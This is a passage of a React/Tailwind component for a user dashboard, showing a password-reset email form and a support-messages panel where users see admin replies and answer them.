                  <p className="text-sm text-slate-400">Enter your email to receive a password reset link.</p>
                  <div className="space-y-2">
                    <input
                        type="email"
                        value={resetEmail}
                        onChange={(e) => setResetEmail(e.target.value)}
                        placeholder="Enter your email address"
                        className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
                      />
                  </div>
                  <button
                    onClick={handleForgotPassword}
                    className="w-full rounded-3xl bg-slate-700 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-white transition hover:bg-slate-600"
                  >
                    Send Reset Link
                  </button>
                </div>
              </div>
            </div>
          </aside>
        </section>

        <section className="mt-6 glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-teal-500/5">
          <div className="flex flex-col gap-4 md:flex-row md:items-center md:justify-between">
            <div>
              <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Support & Messages</p>
              <h2 className="mt-2 text-2xl font-semibold">Admin Replies & Updates</h2>
            </div>
            <span className="rounded-full bg-slate-900/80 px-4 py-2 text-xs uppercase tracking-[0.3em] text-slate-300 border border-slate-700">
              {supportMessages.filter((msg: any) => msg.adminReply).length} replies
            </span>
          </div>

          <div className="mt-6 space-y-4">
            {supportMessages.length === 0 ? (
              <p className="text-slate-400">No messages yet.</p>
            ) : (
              supportMessages.map((msg) => (
                <div key={msg.id} className="rounded-3xl border border-white/10 bg-slate-950/80 p-5">
                  <div className="flex items-center justify-between gap-3 mb-3">
                    <span className="text-[10px] uppercase tracking-[0.3em] text-slate-500">{msg.from} - {formatMessageTime(msg.time || msg.timestamp || msg.createdAt)}</span>
                    {msg.adminReply && <span className="text-green-400 text-xs font-semibold">✓ REPLIED</span>}
                  </div>
                  <p className="text-sm leading-7 text-slate-200"><strong>Your message:</strong> {msg.message || msg.content}</p>
                  
                  {msg.adminReply && (
                    <div className="mt-4 rounded-2xl bg-teal-500/10 border border-teal-500/20 p-4">
                      <p className="text-xs uppercase tracking-[0.3em] text-teal-300 mb-2">Admin Reply - {formatMessageTime(msg.adminReplyTime)}</p>
                      <p className="text-sm text-slate-100">{msg.adminReply}</p>
                      {selectedMessageId !== msg.id && (
                        <button
                          onClick={() => setSelectedMessageId(msg.id)}
                          className="mt-3 text-teal-300 text-xs hover:underline"
                        >
                          Reply to Admin
                        </button>
                      )}
                      {selectedMessageId === msg.id && (
                        <div className="mt-3">
                          <textarea
                            value={replyText}
                            onChange={(e) => setReplyText(e.target.value)}
                            placeholder="Type your reply here"
                            className="w-full rounded-2xl border border-white/10 bg-slate-900/80 px-4 py-2 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
                          />
                          <button
                            onClick={() => handleReplyToAdmin(msg.id)}
                            className="mt-2 rounded-2xl bg-teal-500 px-4 py-2 text-sm font-semibold text-black hover:bg-teal-400"
                          >
                            Send Reply
                          </button>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              ))
            )}
          </div>
        </section>
      </div>
    </div>
  );
}